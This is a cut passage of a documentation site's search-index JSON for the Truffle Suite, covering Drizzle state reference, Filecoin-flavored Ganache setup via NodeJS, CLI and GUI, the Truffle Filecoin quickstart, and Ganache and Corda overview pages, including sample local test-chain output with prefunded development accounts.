contracts : { contractName : { initialized , synced , events , callerFunctionName : { argsHash : { args , value } } } }, currentBlock , drizzleStatus : { initialized }, transactions : { txHash : { confirmations , error , receipt , status } }, transactionStack , web3 : { status } }","title":"Drizzle State"},{"location":"docs/drizzle/reference/drizzle-state.html#accounts-array","text":"An array of account addresses from web3 .","title":"accounts (array)"},{"location":"docs/drizzle/reference/drizzle-state.html#accountbalances-object","text":"An object whose keys are account addresses and values are account balances (in Wei).","title":"accountBalances (object)"},{"location":"docs/drizzle/reference/drizzle-state.html#contracts-object","text":"A series of contract state objects, indexed by the contract name as declared in its ABI.","title":"contracts (object)"},{"location":"docs/drizzle/reference/drizzle-state.html#contractname-object","text":"initialized (boolean): true once contract is fully instantiated. synced (boolean): false if contract state changes have occurred in a block and Drizzle is re-running its calls. events (array): An array of event objects. Drizzle will only listen for the events we declared in options. The contract's state also includes the state of each constant function called on the contract ( callerFunctionName ). The functions are indexed by name, and contain the outputs indexed by a hash of the arguments passed during the call ( argsHash ). If no arguments were passed, the hash is 0x0 . Drizzle reads from the store for you, so it should be unnecessary to touch this data cache manually. args (array): Arguments passed to function call. value (mixed): Value returned from function call.","title":"contractName (object)"},{"location":"docs/drizzle/reference/drizzle-state.html#currentblock-object","text":"An object the latest block as an object resulting from web3.getBlock() . This is updated once the block is received from a subscription or fetched via polling, but before any processing takes place.","title":"currentBlock (object)"},{"location":"docs/drizzle/reference/drizzle-state.html#drizzlestatus-object","text":"An object containing information about the status of Drizzle. initialized (boolean): true once: * web3 is found or instantiated * Account addresses are stored in state * All contracts are instantiated","title":"drizzleStatus (object)"},{"location":"docs/drizzle/reference/drizzle-state.html#initialized-boolean","text":"false by default, becomes true once a web3 instance is found and the accounts and contracts are fetched.","title":"initialized (boolean)"},{"location":"docs/drizzle/reference/drizzle-state.html#transactions-object","text":"A series of transaction objects, indexed by transaction hash.","title":"transactions (object)"},{"location":"docs/drizzle/reference/drizzle-state.html#txhash-object","text":"confirmations (array): After the initial receipt, further confirmation receipts (up to the 24th). error (object): contains the returned error if any. receipt (object): contains the first transaction receipt received from a transaction's success event. status (string): true or false depending on transaction status * pending when the transaction has broadcasted successfully, but is not yet mined * success when a transaction receipt has been received (you may also wish to check for further confirmations) * error if any errors occurred after broadcasting For more in-depth information on the Ethereum transaction lifecycle, check out this great blog post .","title":"txHash (object)"},{"location":"docs/drizzle/reference/drizzle-state.html#transactionstack-array","text":"In cases where a user cancels a transaction or the transaction is malformed and unable to be broadcasted, it won't receive a hash. To keep track of these cases, a temporary ID will be added to this array and replaced with the transaction hash once broadcasted. The cacheSend() method will return a stackId , which will allow you get the temporary ID to observe this process for your own transaction status indicator UI.","title":"transactionStack (array)"},{"location":"docs/drizzle/reference/drizzle-state.html#web3-object","text":"status (string): initializing , initialized and failed are possible options. Useful for triggering warnings if web3 fails to instantiate.","title":"web3 (object)"},{"location":"docs/drizzle/reference/how-data-stays-fresh.html","text":"How Data Stays Fresh \u00b6 Once initialized, Drizzle instantiates web3 and our desired contracts, then observes the chain by subscribing to new block headers. Drizzle keeps track of contract calls so it knows what to synchronize. When a new block header comes in, Drizzle checks that the block isn't pending, then goes through the transactions looking to see if any of them touched our contracts. If they did, we replay the calls already in the store to refresh any potentially altered data. If they didn't we continue with the store data.","title":"Drizzle | How Data Stays Fresh"},{"location":"docs/drizzle/reference/how-data-stays-fresh.html#how-data-stays-fresh","text":"Once initialized, Drizzle instantiates web3 and our desired contracts, then observes the chain by subscribing to new block headers. Drizzle keeps track of contract calls so it knows what to synchronize. When a new block header comes in, Drizzle checks that the block isn't pending, then goes through the transactions looking to see if any of them touched our contracts. If they did, we replay the calls already in the store to refresh any potentially altered data. If they didn't we continue with the store data.","title":"How Data Stays Fresh"},{"location":"docs/filecoin/ganache/overview.html","text":"Working With Filecoin \u00b6 Ganache supports development with Filecoin , a decentralized storage network with built-in incentives. It is highly recommended you checkout the official Filecoin development documentation before getting started with Filecoin-flavored Ganache. The documentation is split up by the various ways you can use Ganache; each page includes requirements, installation, usage, and configuration for each: - CLI - GUI - NodeJS","title":"Ganache | Working With Filecoin"},{"location":"docs/filecoin/ganache/overview.html#working-with-filecoin","text":"Ganache supports development with Filecoin , a decentralized storage network with built-in incentives. It is highly recommended you checkout the official Filecoin development documentation before getting started with Filecoin-flavored Ganache. The documentation is split up by the various ways you can use Ganache; each page includes requirements, installation, usage, and configuration for each: - CLI - GUI - NodeJS","title":"Working With Filecoin"},{"location":"docs/filecoin/ganache/getting-started/get-started-with-nodejs.html","text":"Get Started With using the Filecoin-flavored Ganache as a NodeJS Dependency \u00b6 Requirements \u00b6 Using the Filecoin-flavored Ganache NodeJS module requires NodeJS version 12.13.0 or later. You can check your current version by running: node --version Installation \u00b6 If you're using Filecoin-flavored Ganache as a NodeJS dependency, you need to make sure you install both the ganache package (with the filecoin tag) and the @ganache/filecoin package. # install the base Ganache package npm install ganache@filecoin # install the Filecoin peer dependency package npm install @ganache/filecoin Usage \u00b6 In your code, you will import / require the ganache package directly to instantiate the Filecoin flavor. Below is an example on how to do that with the default options . import Ganache from \"ganache\" ; const startupOptions = { flavor : \"filecoin\" ; } // Provider usage const provider = Ganache . provider ( startupOptions ); const result = await provider . send ({ jsonrpc : \"2.0\" , id : \"0\" , method : \"Filecoin.Version\" , params : [] }); // Server usage (starts up a HTTP and WebSocket server) const server = Ganache . server ( startupOptions ); server . listen ( 7777 , () => { console . log ( \"Lotus RPC endpoint listening at http://localhost:7777/rpc/v0\" ); }); Configuration \u00b6 See the web documentation for more details on the available NodeJS options. Like the above usage example where { flavor } was provided in startupOptions , the options in the web documentation are provide flavor . For example: { \"flavor\": \"filecoin\", \"chain\": { /* ... */ }, \"database\": { /* ... */ }, \"logging\": { /* ... */ }, \"miner\": { /* ... */ }, \"wallet\": { /* ... */ } }","title":"Ganache | Filecoin-flavored NodeJS Library"},{"location":"docs/filecoin/ganache/getting-started/get-started-with-nodejs.html#get-started-with-using-the-filecoin-flavored-ganache-as-a-nodejs-dependency","text":"","title":"Get Started With using the Filecoin-flavored Ganache as a NodeJS Dependency"},{"location":"docs/filecoin/ganache/getting-started/get-started-with-nodejs.html#requirements","text":"Using the Filecoin-flavored Ganache NodeJS module requires NodeJS version 12.13.0 or later. You can check your current version by running: node --version","title":"Requirements"},{"location":"docs/filecoin/ganache/getting-started/get-started-with-nodejs.html#installation","text":"If you're using Filecoin-flavored Ganache as a NodeJS dependency, you need to make sure you install both the ganache package (with the filecoin tag) and the @ganache/filecoin package. # install the base Ganache package npm install ganache@filecoin # install the Filecoin peer dependency package npm install @ganache/filecoin","title":"Installation"},{"location":"docs/filecoin/ganache/getting-started/get-started-with-nodejs.html#usage","text":"In your code, you will import / require the ganache package directly to instantiate the Filecoin flavor. Below is an example on how to do that with the default options . import Ganache from \"ganache\" ; const startupOptions = { flavor : \"filecoin\" ; } // Provider usage const provider = Ganache . provider ( startupOptions ); const result = await provider . send ({ jsonrpc : \"2.0\" , id : \"0\" , method : \"Filecoin.Version\" , params : [] }); // Server usage (starts up a HTTP and WebSocket server) const server = Ganache . server ( startupOptions ); server . listen ( 7777 , () => { console . log ( \"Lotus RPC endpoint listening at http://localhost:7777/rpc/v0\" ); });","title":"Usage"},{"location":"docs/filecoin/ganache/getting-started/get-started-with-nodejs.html#configuration","text":"See the web documentation for more details on the available NodeJS options. Like the above usage example where { flavor } was provided in startupOptions , the options in the web documentation are provide flavor . For example: { \"flavor\": \"filecoin\", \"chain\": { /* ... */ }, \"database\": { /* ... */ }, \"logging\": { /* ... */ }, \"miner\": { /* ... */ }, \"wallet\": { /* ... */ } }","title":"Configuration"},{"location":"docs/filecoin/ganache/getting-started/get-started-with-the-cli.html","text":"Get Started With using the Filecoin-flavored Ganache CLI \u00b6 Requirements \u00b6 Filecoin-flavored Ganache CLI requires NodeJS version 12.13.0 or later. You can check your current version by running: node --version Installation \u00b6 Install the ganache package globally with the filecoin tag (note that we're not installing the old ganache-cli package) npm install --global ganache@filecoin Install the @ganache/filecoin globally npm install --global @ganache/filecoin Usage \u00b6 The CLI can be easily ran by providing the filecoin argument to the ganache executable. ganache filecoin You should presented with a screen of all of the prefunded addresses and their private keys: Ganache CLI v0.1.0 (ganache-core: 0.1.0) Starting RPC server 2021-03-16T05:07:27.175Z INFO New heaviest tipset! [bafy2bzacecsmfrjsop5d5qtmxqyqenodd52xzoe4uorqkq7537gyade5mzpui] (height=0) Available Accounts ================== (0) t3rvcqmc5otc3sh3cngqg2ttzcu7ezpco466lbafzaoygxvnzsw7e7n2zbjwhiv5fdzhs6uxm2qckwt6lp5wga (100 FIL) (1) t3s3la37547tijmoeiep7ktogws3tep2eqrralh7rhi2mpe46q574gceyy467356onblzvwf7ejlelo2rdsg4q (100 FIL) (2) t3wk7a46e2dcqb7qxeuz2zq7wodwycdgtbgdpr37hhvelfilf5yvssg5xbsolgusqsumomtmtqhnobh4carhyq (100 FIL) (3) t3ssnxhgmcea443y6bkcjgehxzzzqly6t3nic3tttb2gka4t7blfpshjvo5dtxkhxyqygja5b2vn5evont2nda (100 FIL) (4) t3vtdookvprpwquu2g5abxsnnvvk2kzlh3uoq7cqjvmfposrozcbm6pm26xuo63wbypvbdecgyqpbxmuqpsela (100 FIL) (5) t3u6cdui7nrxjtfl2wuwt642xsqlpziqodck7ew7fllrgx4induoik4oebyftmggxrf2bcgaaei7ngnnoc744q (100 FIL) (6) t3v74brbo7e5e5nagvrbgxyccy47znpddhw2e3jzsj2zqjfe2kjnhxk32uxypdzzwpkobyzalsfhx3dfh6g4ea (100 FIL) (7) t3rjlklkxt5ikfzj2wcsukyk4makuq4eugtcnx6y3lwjrw7h7dnfi47npbklvrjbyqe3vxpacpcupukacjvd2q (100 FIL) (8) t3rihx2zizueb7n4dwmfzlsefzfnujbmjurmpsj474pip5qw2yq5migy3t5phofnicfa3bewvan5kwz3mxz7kq (100 FIL) (9) t3wxnwc7gptzjfherhrg6cavic5uc3nb34wjp5ic6comad6xfnfgalxaus7q5ml2jptf5tisuuovogxjqh4jaq (100 FIL) Private Keys ================== (0) 7add859e8942a1009bc7795f5537c6505323a62c4cfc7c27fd48602841cf6b18 (1) ab8fe5451a44b9e12f6bd8ffb1760de60e0614c3563220537e0da29e69337947 (2) e16edeaba1b619a9a8f95cf2bae80fc3532307043f323dfa34911ad8714fe39d (3) 2745fc03b31b2fb8907504b0aa00796c762a39f928260f5ba2dddccdca1933db (4) 27194755b340e21df79d5451f67f054e01a9de18036901e3be08eeb46013a5a6 (5) a51831112131f6520a647fd5a845e39e4b62c780319c7b5e929d15c407b196e6 (6) 841e0ef5e1742949c79ce8bfd42a254debad75c189e89d98292cc60092dcad50 (7) 6dcc42d3ab8e581e1841ccb1c551f3dbb95118fc61f334fba0a17f2d548fbe96 (8) 899081442676fcb592aa3fad880ca1a7a48e7f05eb1caaf16f4c455114ddf598 (9) 525053ec3d8dd48db07177fdb5988acb07749525c0269af6f50d7320c5a29d3b Lotus RPC listening on 127.0.0.1:7777 IPFS RPC listening on 127.0.0.1:5001 If you would like to use the ethereum flavor, please use the ganache-cli package . Configuration \u00b6 See available options with: ganache filecoin --help","title":"Ganache | Filecoin-flavored CLI"},{"location":"docs/filecoin/ganache/getting-started/get-started-with-the-cli.html#get-started-with-using-the-filecoin-flavored-ganache-cli","text":"","title":"Get Started With using the Filecoin-flavored Ganache CLI"},{"location":"docs/filecoin/ganache/getting-started/get-started-with-the-cli.html#requirements","text":"Filecoin-flavored Ganache CLI requires NodeJS version 12.13.0 or later. You can check your current version by running: node --version","title":"Requirements"},{"location":"docs/filecoin/ganache/getting-started/get-started-with-the-cli.html#installation","text":"Install the ganache package globally with the filecoin tag (note that we're not installing the old ganache-cli package) npm install --global ganache@filecoin Install the @ganache/filecoin globally npm install --global @ganache/filecoin","title":"Installation"},{"location":"docs/filecoin/ganache/getting-started/get-started-with-the-cli.html#usage","text":"The CLI can be easily ran by providing the filecoin argument to the ganache executable. ganache filecoin You should presented with a screen of all of the prefunded addresses and their private keys: Ganache CLI v0.1.0 (ganache-core: 0.1.0) Starting RPC server 2021-03-16T05:07:27.175Z INFO New heaviest tipset! [bafy2bzacecsmfrjsop5d5qtmxqyqenodd52xzoe4uorqkq7537gyade5mzpui] (height=0) Available Accounts ================== (0) t3rvcqmc5otc3sh3cngqg2ttzcu7ezpco466lbafzaoygxvnzsw7e7n2zbjwhiv5fdzhs6uxm2qckwt6lp5wga (100 FIL) (1) t3s3la37547tijmoeiep7ktogws3tep2eqrralh7rhi2mpe46q574gceyy467356onblzvwf7ejlelo2rdsg4q (100 FIL) (2) t3wk7a46e2dcqb7qxeuz2zq7wodwycdgtbgdpr37hhvelfilf5yvssg5xbsolgusqsumomtmtqhnobh4carhyq (100 FIL) (3) t3ssnxhgmcea443y6bkcjgehxzzzqly6t3nic3tttb2gka4t7blfpshjvo5dtxkhxyqygja5b2vn5evont2nda (100 FIL) (4) t3vtdookvprpwquu2g5abxsnnvvk2kzlh3uoq7cqjvmfposrozcbm6pm26xuo63wbypvbdecgyqpbxmuqpsela (100 FIL) (5) t3u6cdui7nrxjtfl2wuwt642xsqlpziqodck7ew7fllrgx4induoik4oebyftmggxrf2bcgaaei7ngnnoc744q (100 FIL) (6) t3v74brbo7e5e5nagvrbgxyccy47znpddhw2e3jzsj2zqjfe2kjnhxk32uxypdzzwpkobyzalsfhx3dfh6g4ea (100 FIL) (7) t3rjlklkxt5ikfzj2wcsukyk4makuq4eugtcnx6y3lwjrw7h7dnfi47npbklvrjbyqe3vxpacpcupukacjvd2q (100 FIL) (8) t3rihx2zizueb7n4dwmfzlsefzfnujbmjurmpsj474pip5qw2yq5migy3t5phofnicfa3bewvan5kwz3mxz7kq (100 FIL) (9) t3wxnwc7gptzjfherhrg6cavic5uc3nb34wjp5ic6comad6xfnfgalxaus7q5ml2jptf5tisuuovogxjqh4jaq (100 FIL) Private Keys ================== (0) 7add859e8942a1009bc7795f5537c6505323a62c4cfc7c27fd48602841cf6b18 (1) ab8fe5451a44b9e12f6bd8ffb1760de60e0614c3563220537e0da29e69337947 (2) e16edeaba1b619a9a8f95cf2bae80fc3532307043f323dfa34911ad8714fe39d (3) 2745fc03b31b2fb8907504b0aa00796c762a39f928260f5ba2dddccdca1933db (4) 27194755b340e21df79d5451f67f054e01a9de18036901e3be08eeb46013a5a6 (5) a51831112131f6520a647fd5a845e39e4b62c780319c7b5e929d15c407b196e6 (6) 841e0ef5e1742949c79ce8bfd42a254debad75c189e89d98292cc60092dcad50 (7) 6dcc42d3ab8e581e1841ccb1c551f3dbb95118fc61f334fba0a17f2d548fbe96 (8) 899081442676fcb592aa3fad880ca1a7a48e7f05eb1caaf16f4c455114ddf598 (9) 525053ec3d8dd48db07177fdb5988acb07749525c0269af6f50d7320c5a29d3b Lotus RPC listening on 127.0.0.1:7777 IPFS RPC listening on 127.0.0.1:5001 If you would like to use the ethereum flavor, please use the ganache-cli package .","title":"Usage"},{"location":"docs/filecoin/ganache/getting-started/get-started-with-the-cli.html#configuration","text":"See available options with: ganache filecoin --help","title":"Configuration"},{"location":"docs/filecoin/ganache/getting-started/get-started-with-the-gui.html","text":"Get Started With using Filecoin-flavored Ganache GUI \u00b6 Installation \u00b6 Filecoin-flavored Ganache is included in Ganache UI starting in vTODO and later. If you don't have that version, be sure to update it using the in-app updater or manually install the latest version . Usage \u00b6 First, be sure to select the FILECOIN flavor in the dropdown under QUICKSTART button on the home screen. From here, you can click the QUICKSTART or NEW WORKSPACE buttons. QUICKSTART is the quickest way to get started, and you can save the workspace later. You can read more about workspaces in the dedicated documentation section . Accounts \u00b6 Once Ganache has started, you'll be presented with the Accounts page. Here you can see a list of accounts generated from a random seed and prefunded with some FIL (all configurable ). Filecoin-flavor Ganache doesn't support mnemonics currently, but you can specify the seed in the Settings . Tipsets \u00b6 The Tipsets page shows you a list of the tipsets mined. You can click on a tipset row to see more details, including details of the blocks included in the tipset. If you're not familiar with using Ganache, then you'll quickly learn that most of the blocks of information are clickable for more information. Clicking on a block row in the tipset detail page will bring you to the block's detail page. Messages \u00b6 The Messages page lists the most recent messages. You can click on a message to see the message's detail. You can also get to the message detail page from the block detail page available from the tipset detail page ; Deals \u00b6 The Deals page lists all of the storage deals, regardless of state. These are not clickable currently, but this page is a great place to get an overview. Files \u00b6 The Files page lists all of the pinned files within IPFS. If you're using the Filecoin Network Inspector sample app to create storage deals, those files automatically get pinned with the ipfs.add() JS function it uses. Do note that these are all of your pinned IPFS files, not just those associated with storage deals . You can also click the DOWNLOAD button to save the file to your computer. Configuration \u00b6 You can get to Settings page by pressing the button available in the header bar. From here, you'll see different settings grouped by category. The WORKSPACE tab just lets you change the workspace name if you're not using the Quickstart Workspace. The SERVER tab lets you change the hosts/interfaces and ports for the Lotus and IPFS servers to listen on. The ACCOUNTS & KEYS tab lets you change the default account FIL balance, number of accounts, and random number generator seed. The MINER tab allows you to enable/disable the miner as well as set the mining interval or use automining.","title":"Ganache | Filecoin-flavored GUI"},{"location":"docs/filecoin/ganache/getting-started/get-started-with-the-gui.html#get-started-with-using-filecoin-flavored-ganache-gui","text":"","title":"Get Started With using Filecoin-flavored Ganache GUI"},{"location":"docs/filecoin/ganache/getting-started/get-started-with-the-gui.html#installation","text":"Filecoin-flavored Ganache is included in Ganache UI starting in vTODO and later. If you don't have that version, be sure to update it using the in-app updater or manually install the latest version .","title":"Installation"},{"location":"docs/filecoin/ganache/getting-started/get-started-with-the-gui.html#usage","text":"First, be sure to select the FILECOIN flavor in the dropdown under QUICKSTART button on the home screen. From here, you can click the QUICKSTART or NEW WORKSPACE buttons. QUICKSTART is the quickest way to get started, and you can save the workspace later. You can read more about workspaces in the dedicated documentation section .","title":"Usage"},{"location":"docs/filecoin/ganache/getting-started/get-started-with-the-gui.html#accounts","text":"Once Ganache has started, you'll be presented with the Accounts page. Here you can see a list of accounts generated from a random seed and prefunded with some FIL (all configurable ). Filecoin-flavor Ganache doesn't support mnemonics currently, but you can specify the seed in the Settings .","title":"Accounts"},{"location":"docs/filecoin/ganache/getting-started/get-started-with-the-gui.html#tipsets","text":"The Tipsets page shows you a list of the tipsets mined. You can click on a tipset row to see more details, including details of the blocks included in the tipset. If you're not familiar with using Ganache, then you'll quickly learn that most of the blocks of information are clickable for more information. Clicking on a block row in the tipset detail page will bring you to the block's detail page.","title":"Tipsets"},{"location":"docs/filecoin/ganache/getting-started/get-started-with-the-gui.html#messages","text":"The Messages page lists the most recent messages. You can click on a message to see the message's detail. You can also get to the message detail page from the block detail page available from the tipset detail page ;","title":"Messages"},{"location":"docs/filecoin/ganache/getting-started/get-started-with-the-gui.html#deals","text":"The Deals page lists all of the storage deals, regardless of state. These are not clickable currently, but this page is a great place to get an overview.","title":"Deals"},{"location":"docs/filecoin/ganache/getting-started/get-started-with-the-gui.html#files","text":"The Files page lists all of the pinned files within IPFS. If you're using the Filecoin Network Inspector sample app to create storage deals, those files automatically get pinned with the ipfs.add() JS function it uses. Do note that these are all of your pinned IPFS files, not just those associated with storage deals . You can also click the DOWNLOAD button to save the file to your computer.","title":"Files"},{"location":"docs/filecoin/ganache/getting-started/get-started-with-the-gui.html#configuration","text":"You can get to Settings page by pressing the button available in the header bar. From here, you'll see different settings grouped by category. The WORKSPACE tab just lets you change the workspace name if you're not using the Quickstart Workspace. The SERVER tab lets you change the hosts/interfaces and ports for the Lotus and IPFS servers to listen on. The ACCOUNTS & KEYS tab lets you change the default account FIL balance, number of accounts, and random number generator seed. The MINER tab allows you to enable/disable the miner as well as set the mining interval or use automining.","title":"Configuration"},{"location":"docs/filecoin/truffle/quickstart.html","text":"Filecoin Quickstart \u00b6 Wanna build apps on Filecoin using Truffle? You're in the right place. Ganache \u00b6 Looking to set up Filecoin-flavored Ganache? Head over to the Ganache-specific documentation . Table of Contents \u00b6 Getting set up Installing Truffle Using the Filecoin Truffle Box Further Resources Getting Set Up \u00b6 Requirements \u00b6 NodeJS v12.13.0 or later Windows, Linux or Mac OS X Installing Truffle \u00b6 Truffle's Filecoin integration works out of the box with the latest Truffle, so no need to install any special versions for it. $ npm install -g truffle Using the Filecoin Truffle Box \u00b6 This quick start uses an already-created project to provide the base Truffle project structure and example contracts. In your workspace directory, run the following commands: $ mkdir filecoin-example $ cd filecoin-example $ truffle unbox filecoin More specific usage information about the Filecoin Truffle Box can be found in its README . Preserving files to IPFS and Filecoin \u00b6 Truffle offers builtin functionality to preserve any files and directories to IPFS, Filecoin or Textile Buckets through the truffle preserve command. This works with local IPFS / Filecoin nodes, remote nodes and Filecoin-flavored Ganache! Besides this, truffle preserve also has support for Textile Buckets , which offers a smooth user experience around IPFS and Filecoin. $ truffle preserve ./stuff --ipfs $ truffle preserve ./stuff --filecoin $ truffle preserve ./stuff --buckets For extensive documentation on truffle preserve refer to the main Truffle documentation . Further Resources \u00b6 If you've reached this point, you now have a Truffle project that lets you interact with the Filecoin network. Congrats! This is a great start, but there's still much to learn. We suggest you check out the following resources to learn more about Filecoin, Textile, Ganache, and the entire Truffle Suite: Filecoin documentation Textile documentation Filecoin-flavored Ganache documentation Main Truffle Suite documentation","title":"Filecoin Quickstart"},{"location":"docs/filecoin/truffle/quickstart.html#filecoin-quickstart","text":"Wanna build apps on Filecoin using Truffle? You're in the right place.","title":"Filecoin Quickstart"},{"location":"docs/filecoin/truffle/quickstart.html#ganache","text":"Looking to set up Filecoin-flavored Ganache? Head over to the Ganache-specific documentation .","title":"Ganache"},{"location":"docs/filecoin/truffle/quickstart.html#table-of-contents","text":"Getting set up Installing Truffle Using the Filecoin Truffle Box Further Resources","title":"Table of Contents"},{"location":"docs/filecoin/truffle/quickstart.html#getting-set-up","text":"","title":"Getting Set Up"},{"location":"docs/filecoin/truffle/quickstart.html#requirements","text":"NodeJS v12.13.0 or later Windows, Linux or Mac OS X","title":"Requirements"},{"location":"docs/filecoin/truffle/quickstart.html#installing-truffle","text":"Truffle's Filecoin integration works out of the box with the latest Truffle, so no need to install any special versions for it. $ npm install -g truffle","title":"Installing Truffle"},{"location":"docs/filecoin/truffle/quickstart.html#using-the-filecoin-truffle-box","text":"This quick start uses an already-created project to provide the base Truffle project structure and example contracts. In your workspace directory, run the following commands: $ mkdir filecoin-example $ cd filecoin-example $ truffle unbox filecoin More specific usage information about the Filecoin Truffle Box can be found in its README .","title":"Using the Filecoin Truffle Box"},{"location":"docs/filecoin/truffle/quickstart.html#preserving-files-to-ipfs-and-filecoin","text":"Truffle offers builtin functionality to preserve any files and directories to IPFS, Filecoin or Textile Buckets through the truffle preserve command. This works with local IPFS / Filecoin nodes, remote nodes and Filecoin-flavored Ganache! Besides this, truffle preserve also has support for Textile Buckets , which offers a smooth user experience around IPFS and Filecoin. $ truffle preserve ./stuff --ipfs $ truffle preserve ./stuff --filecoin $ truffle preserve ./stuff --buckets For extensive documentation on truffle preserve refer to the main Truffle documentation .","title":"Preserving files to IPFS and Filecoin"},{"location":"docs/filecoin/truffle/quickstart.html#further-resources","text":"If you've reached this point, you now have a Truffle project that lets you interact with the Filecoin network. Congrats! This is a great start, but there's still much to learn. We suggest you check out the following resources to learn more about Filecoin, Textile, Ganache, and the entire Truffle Suite: Filecoin documentation Textile documentation Filecoin-flavored Ganache documentation Main Truffle Suite documentation","title":"Further Resources"},{"location":"docs/ganache/index.html","text":"Overview \u00b6 Ganache is a personal blockchain for rapid Ethereum and Corda distributed application development. You can use Ganache across the entire development cycle; enabling you to develop, deploy, and test your dApps in a safe and deterministic environment. Ganache comes in two flavors: a UI and CLI. Ganache UI is a desktop application supporting both Ethereum and Corda technology. The command-line tool, ganache-cli (formerly known as the TestRPC), is available for Ethereum development. Prefer using the command-line? This documentation will focus only on the UI flavor of Ganache. Please see the Ganache CLI Readme for command-line documentation. All versions of Ganache are available for Windows, Mac, and Linux.","title":"Overview"},{"location":"docs/ganache/index.html#overview","text":"Ganache is a personal blockchain for rapid Ethereum and Corda distributed application development. You can use Ganache across the entire development cycle; enabling you to develop, deploy, and test your dApps in a safe and deterministic environment. Ganache comes in two flavors: a UI and CLI. Ganache UI is a desktop application supporting both Ethereum and Corda technology. The command-line tool, ganache-cli (formerly known as the TestRPC), is available for Ethereum development. Prefer using the command-line? This documentation will focus only on the UI flavor of Ganache. Please see the Ganache CLI Readme for command-line documentation. All versions of Ganache are available for Windows, Mac, and Linux.","title":"Overview"},{"location":"docs/ganache/quickstart.html","text":"Ganache Quickstart \u00b6 This quickstart guide will walk you through installing Ganache and creating a personal development blockchain via a quickstart workspace. If this isn't your first time using Ganache, or you already know you'll need custom configuration options, check out the Creating Workspaces documentation . Working with Ethereum and prefer using the command line? : This page will focus only on the graphical interface. Please see the Ganache CLI Readme for more information on the command line flavor of Ganache. 1. Install Ganache \u00b6 Download the appropriate version for your OS: Windows: Ganache-*.appx Mac: Ganache-*.dmg Linux: ganache-*.AppImage Next, double-click on the downloaded file, follow the prompts, and you're up and running. Note : The first time you launch Ganache, you will be asked if you want to allow Google Analytics tracking. While optional, turning this on will help the development team gain more insight into how Ganache is used. This tracking is totally anonymous, and no account data or private keys will ever be shared. 2. Create a Workspace \u00b6 When you open Ganache for the first time, you'll see the home screen. On this screen you're prompted to load an existing workspace (if any exist), create a new custom workspace, or quickstart a one-click blockchain with default options . For now, let's go with a quickstart workspace. Select the desired blockchain from the QUICKSTART drop down; you can choose to start an Ethereum node or Corda network, then click the QUICKSTART button. Now that you've got a workspace created, let's take a look at what you can do: Ethereum workspace overview Corda workspace overview","title":"Quickstart"},{"location":"docs/ganache/quickstart.html#ganache-quickstart","text":"This quickstart guide will walk you through installing Ganache and creating a personal development blockchain via a quickstart workspace. If this isn't your first time using Ganache, or you already know you'll need custom configuration options, check out the Creating Workspaces documentation . Working with Ethereum and prefer using the command line? : This page will focus only on the graphical interface. Please see the Ganache CLI Readme for more information on the command line flavor of Ganache.","title":"Ganache Quickstart"},{"location":"docs/ganache/quickstart.html#1-install-ganache","text":"Download the appropriate version for your OS: Windows: Ganache-*.appx Mac: Ganache-*.dmg Linux: ganache-*.AppImage Next, double-click on the downloaded file, follow the prompts, and you're up and running. Note : The first time you launch Ganache, you will be asked if you want to allow Google Analytics tracking. While optional, turning this on will help the development team gain more insight into how Ganache is used. This tracking is totally anonymous, and no account data or private keys will ever be shared.","title":"1. Install Ganache"},{"location":"docs/ganache/quickstart.html#2-create-a-workspace","text":"When you open Ganache for the first time, you'll see the home screen. On this screen you're prompted to load an existing workspace (if any exist), create a new custom workspace, or quickstart a one-click blockchain with default options . For now, let's go with a quickstart workspace. Select the desired blockchain from the QUICKSTART drop down; you can choose to start an Ethereum node or Corda network, then click the QUICKSTART button. Now that you've got a workspace created, let's take a look at what you can do: Ethereum workspace overview Corda workspace overview","title":"2. Create a Workspace"},{"location":"docs/ganache/corda/cordapps.html","text":"CorDapps \u00b6 For Corda technical documentation not related to Ganache head over to Corda's official documentation . The Corda CorDapps lists all CorDapp jars discovered on the network. Clicking on a CorDapp will open the CorDapp details screen, displaying a list of nodes that have this CorDapp installed, as well as an transactions that used flows from this CorDapp. Related Documentation \u00b6 Corda Overview Nodes Transactions","title":"Ganache | Corda CorDapps"},{"location":"docs/ganache/corda/cordapps.html#cordapps","text":"For Corda technical documentation not related to Ganache head over to Corda's official documentation . The Corda CorDapps lists all CorDapp jars discovered on the network. Clicking on a CorDapp will open the CorDapp details screen, displaying a list of nodes that have this CorDapp installed, as well as an transactions that used flows from this CorDapp.","title":"CorDapps"},{"location":"docs/ganache/corda/cordapps.html#related-documentation","text":"Corda Overview Nodes Transactions","title":"Related Documentation"},{"location":"docs/ganache/corda/linking-a-corda-project.html","text":"Linking a CorDapp Project \u00b6 To link a project, enter the settings by clicking the gear icon in the upper right. You should be seeing the WORKSPACE settings pane; if not, you can get there by clicking the WORKSPACE tab in the top left. From here, there is a section labeled PROJECTS . Beneath this box, click the button ADD PROJECT . A folder selection modal will appear. Select the folder of your CordApp project. Ganache will inspect the directory for folders with a build.gradle file containing the string \"corda\" , and if found, will automatically watch the ./build/libs folder for new/changed .jar files. If the folder you choose does not have a compatible build.gradle Ganache will watch the folder itself for new/changed .jar files. After selecting the folder, you'll see it listed in the PROJECTS section. You can add multiple projects to a workspace. After you're finished adding projects you can click the SAVE AND RESTART ( SAVE WORKSPACE if this is a new workspace) button in the top right.","title":"Ganache | Linking a CorDapp"},{"location":"docs/ganache/corda/linking-a-corda-project.html#linking-a-cordapp-project","text":"To link a project, enter the settings by clicking the gear icon in the upper right. You should be seeing the WORKSPACE settings pane; if not, you can get there by clicking the WORKSPACE tab in the top left. From here, there is a section labeled PROJECTS . Beneath this box, click the button ADD PROJECT . A folder selection modal will appear. Select the folder of your CordApp project. Ganache will inspect the directory for folders with a build.gradle file containing the string \"corda\" , and if found, will automatically watch the ./build/libs folder for new/changed .jar files. If the folder you choose does not have a compatible build.gradle Ganache will watch the folder itself for new/changed .jar files. After selecting the folder, you'll see it listed in the PROJECTS section. You can add multiple projects to a workspace. After you're finished adding projects you can click the SAVE AND RESTART ( SAVE WORKSPACE if this is a new workspace) button in the top right.","title":"Linking a CorDapp Project"},{"location":"docs/ganache/corda/nodes.html","text":"Nodes \u00b6 For Corda technical documentation not related to Ganache head over to Corda's official documentation . The Nodes screen lists all the nodes and notaries on the network. Clicking on a node opens the Node Details screen for that node, displaying connection details, transactions , cordapps , and connected nodes/notaries. Related Documentation \u00b6 Corda Overview Transactions CorDapps Shell","title":"Ganache | Corda Nodes"},{"location":"docs/ganache/corda/nodes.html#nodes","text":"For Corda technical documentation not related to Ganache head over to Corda's official documentation . The Nodes screen lists all the nodes and notaries on the network. Clicking on a node opens the Node Details screen for that node, displaying connection details, transactions , cordapps , and connected 